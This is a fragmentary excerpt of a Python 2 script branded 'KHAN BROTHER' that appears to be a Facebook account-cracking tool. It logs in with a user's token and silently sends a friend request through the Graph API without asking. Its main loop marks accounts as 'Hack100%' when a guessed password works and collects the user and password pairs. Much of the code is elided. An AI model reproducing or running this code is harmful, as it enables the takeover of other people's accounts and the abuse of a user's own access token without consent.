...
\033[1;92m║══▒═✺═▒═✺═▒═══¤═¤═¤════════════¤══║
\033[1;96m║✯ Creator : KHAN BROTHER         ║        
\033[1;98m║✯ Mr x KHAN                  ║ 
...
print  """
\033[1;97m************************************************
\033[1;96m~ IM NOT RESPONSIBLE FOR ANY MISS USE Mr.Bro ~
\033[1;97m************************************************
	...
	try:
		...
		if 'save-device' in url:
			try:
				...
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin Hoitaca'
				os.system('xdg-open https://www.youtube.com/channel/UCaDycv8l8cGtCzIYR8ukEvg')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mNetwork problem"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mApnar Account Checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email Vhul hoitaca")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def pilih_super():
	...
	if peak =="":
		...
		os.system('clear')
		print logo
		print "\033[1;97m•◈•═══\033[1;91mKHAN-BROTHER\033[1;97m═══•◈•"
		...
		print "\033[1;95m•◈•══════•◈\033[1;91mMr-KHAN-BROTHER\033[1;95m◈•══════•◈•"
		try:
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;94m[  ✓  ] \x1b[1;92mKHAN-Hack100%'											
				...
				oks.append(user+pass1)
				    ...
				    print '\x1b[1;94m[ ❥ ] \x1b[1;94mKHAN-Checkpoint'
...
╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
           ...
           Checkpoint ID Open After 07 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
